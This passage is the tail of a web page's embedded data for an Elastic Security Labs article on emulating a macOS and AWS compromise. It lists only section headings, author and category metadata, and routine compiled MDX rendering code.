emulation ","href":"#assumptions-for-emulation-"},{"level":2,"title":"Overview of the attack","href":"#overview-of-the-attack"},{"level":2,"title":"Emulating the attack","href":"#emulating-the-attack"},{"level":3,"title":"MacOS endpoint compromise","href":"#macos-endpoint-compromise"},{"level":4,"title":"Malicious Python Application ","href":"#malicious-python-application-"},{"level":4,"title":"PyYAML Deserialization Payload ","href":"#pyyaml-deserialization-payload-"},{"level":4,"title":"Python Loader Script ","href":"#python-loader-script-"},{"level":5,"title":"ret == 0:","href":"#ret--0"},{"level":5,"title":"ret == 1:","href":"#ret--1"},{"level":5,"title":"ret == 2:","href":"#ret--2"},{"level":5,"title":"ret == 3:","href":"#ret--3"},{"level":5,"title":"ret == 9:","href":"#ret--9"},{"level":4,"title":"Python Loader Emulation","href":"#python-loader-emulation"},{"level":5,"title":"Ret == 2: Receive and Execute arbitrary Python code within Process Memory ","href":"#ret--2-receive-and-execute-arbitrary-python-code-within-process-memory-"},{"level":5,"title":"Ret == 3: Write Binary Payload and Binary Config to Disk, Execute Payload and Delete File","href":"#ret--3-write-binary-payload-and-binary-config-to-disk-execute-payload-and-delete-file"},{"level":4,"title":"C2 Infrastructure","href":"#c2-infrastructure"},{"level":4,"title":"Malicious Python Application: Docker Version","href":"#malicious-python-application-docker-version"},{"level":4,"title":"MacOS Emulation Conclusion","href":"#macos-emulation-conclusion"},{"level":3,"title":"AWS cloud compromise","href":"#aws-cloud-compromise"},{"level":4,"title":"Pre-requisities and Setup","href":"#pre-requisities-and-setup"},{"level":4,"title":"Temporary Session Token Retrieval","href":"#temporary-session-token-retrieval"},{"level":4,"title":"MFA Device Registration Attempts","href":"#mfa-device-registration-attempts"},{"level":4,"title":"Assuming the Compromised Identity on Kali","href":"#assuming-the-compromised-identity-on-kali"},{"level":4,"title":"S3 Asset Enumeration","href":"#s3-asset-enumeration"},{"level":4,"title":"Next.js App Overwrite with Malicious Code","href":"#nextjs-app-overwrite-with-malicious-code"},{"level":4,"title":"Static Site Tampering Implications and Missing Security Controls","href":"#static-site-tampering-implications-and-missing-security-controls"},{"level":2,"title":"Lessons in defense","href":"#lessons-in-defense"},{"level":2,"title":"Elastic’s SIEM detection and endpoint prevention rules","href":"#elastics-siem-detection-and-endpoint-prevention-rules"},{"level":4,"title":"[MacOS Endpoint Behavior Prevention Rules](https://github.com/elastic/protections-artifacts/tree/main/behavior/rules/macos)","href":"#macos-endpoint-behavior-prevention-ruleshttpsgithubcomelasticprotections-artifactstreemainbehaviorrulesmacos"},{"level":5,"title":"Python PyYAML Deserialization Payload","href":"#python-pyyaml-deserialization-payload"},{"level":5,"title":"Python Loader Script","href":"#python-loader-script"},{"level":5,"title":"Python Loader Script Ret == 1","href":"#python-loader-script-ret--1"},{"level":5,"title":"Python Loader Script Ret == 2","href":"#python-loader-script-ret--2"},{"level":5,"title":"Python Loader Script Ret == 3","href":"#python-loader-script-ret--3"},{"level":4,"title":"SIEM Detections for AWS CloudTrail Logs","href":"#siem-detections-for-aws-cloudtrail-logs"},{"level":4,"title":"SIEM Detections for Docker Abuse","href":"#siem-detections-for-docker-abuse"},{"level":2,"title":"Mitigations","href":"#mitigations"},{"level":3,"title":"Social Engineering ","href":"#social-engineering-"},{"level":3,"title":"Application and Device Management","href":"#application-and-device-management"},{"level":3,"title":"EDR/XDR","href":"#edrxdr"},{"level":3,"title":"AWS Credential Exposure and Session Token Hardening","href":"#aws-credential-exposure-and-session-token-hardening"},{"level":3,"title":"S3 Application Layer Hardening (Frontend Tampering)","href":"#s3-application-layer-hardening-frontend-tampering"},{"level":2,"title":"Attack Discovery (AD)","href":"#attack-discovery-ad"},{"level":2,"title":"OSQuery","href":"#osquery"},{"level":2,"title":"Conclusion","href":"#conclusion"}],"author":[{"title":"Colson Wilhoit","slug":"colson-wilhoit","description":"Senior Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var i=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,_=Object.prototype.hasOwnProperty;var d=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),h=(t,n)=\u003e{for(var e in n)i(t,e,{get:n[e],enumerable:!0})},a=(t,n,e,s)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let r of f(n))!_.call(t,r)\u0026\u0026r!==e\u0026\u0026i(t,r,{get:()=\u003en[r],enumerable:!(s=x(n,r))||s.enumerable});return t};var j=(t,n,e)=\u003e(e=t!=null?m(g(t)):{},a(n||!t||!t.__esModule?i(e,\"default\",{value:t,enumerable:!0}):e,t)),p=t=\u003ea(i({},\"__esModule\",{value:!0}),t);var l=d((F,c)=\u003e{c.exports=_jsx_runtime});var D={};h(D,{default:()=\u003ew,frontmatter:()=\u003eC});var o=j(l()),C={title:\"Colson Wilhoit\",description:\"Senior Research Engineer, Elastic\",slug:\"colson-wilhoit\"};function u(t){return(0,o.jsx)(o.Fragment,{})}function M(t={}){let{wrapper:n}=t.components||{};return n?(0,o.jsx)(n,Object.assign({},t,{children:(0,o.jsx)(u,t)})):u(t)}var w=M;return p(D);})();\n;return Component;"},"_id":"authors/colson-wilhoit.mdx","_raw":{"sourceFilePath":"authors/colson-wilhoit.mdx","sourceFileName":"colson-wilhoit.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/colson-wilhoit"},"type":"Author","imageUrl":"","url":"/authors/colson-wilhoit"},{"title":"Terrance DeJesus","slug":"terrance-dejesus","description":"Senior Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var o=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,j=Object.prototype.hasOwnProperty;var l=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),_=(e,t)=\u003e{for(var n in t)o(e,n,{get:t[n],enumerable:!0})},c=(e,t,n,a)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let s of f(t))!j.call(e,s)\u0026\u0026s!==n\u0026\u0026o(e,s,{get:()=\u003et[s],enumerable:!(a=d(t,s))||a.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(g(e)):{},c(t||!e||!e.__esModule?o(n,\"default\",{value:e,enumerable:!0}):n,e)),D=e=\u003ec(o({},\"__esModule\",{value:!0}),e);var u=l((F,i)=\u003e{i.exports=_jsx_runtime});var C={};_(C,{default:()=\u003ey,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Terrance DeJesus\",description:\"Senior Security Research Engineer, Elastic\",slug:\"terrance-dejesus\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function h(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var y=h;return D(C);})();\n;return Component;"},"_id":"authors/terrance-dejesus.mdx","_raw":{"sourceFilePath":"authors/terrance-dejesus.mdx","sourceFileName":"terrance-dejesus.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/terrance-dejesus"},"type":"Author","imageUrl":"","url":"/authors/terrance-dejesus"}],"category":[{"title":"Attack pattern","slug":"attack-pattern","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var o=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var _=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),l=(t,n)=\u003e{for(var e in n)o(t,e,{get:n[e],enumerable:!0})},s=(t,n,e,c)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let a of p(n))!g.call(t,a)\u0026\u0026a!==e\u0026\u0026o(t,a,{get:()=\u003en[a],enumerable:!(c=f(n,a))||c.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?x(_(t)):{},s(n||!t||!t.__esModule?o(e,\"default\",{value:t,enumerable:!0}):e,t)),M=t=\u003es(o({},\"__esModule\",{value:!0}),t);var i=j((b,u)=\u003e{u.exports=_jsx_runtime});var F={};l(F,{default:()=\u003eD,frontmatter:()=\u003ek});var r=d(i()),k={title:\"Attack pattern\",slug:\"attack-pattern\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var D=C;return M(F);})();\n;return Component;"},"_id":"categories/attack-pattern.mdx","_raw":{"sourceFilePath":"categories/attack-pattern.mdx","sourceFileName":"attack-pattern.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/attack-pattern"},"type":"Category","url":"/categories/attack-pattern"},{"title":"Detection science","slug":"detection-science","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var c=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)c(t,n,{get:e[n],enumerable:!0})},i=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!g.call(t,o)\u0026\u0026o!==n\u0026\u0026c(t,o,{get:()=\u003ee[o],enumerable:!(s=f(e,o))||s.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?x(d(t)):{},i(e||!t||!t.__esModule?c(n,\"default\",{value:t,enumerable:!0}):n,t)),D=t=\u003ei(c({},\"__esModule\",{value:!0}),t);var u=j((h,a)=\u003e{a.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Detection science\",slug:\"detection-science\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"categories/detection-science.mdx","_raw":{"sourceFilePath":"categories/detection-science.mdx","sourceFileName":"detection-science.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/detection-science"},"type":"Category","url":"/categories/detection-science"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"bit-bybit"},"buildId":"sbHO_V6QtCJgh3oKZP6Tz","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>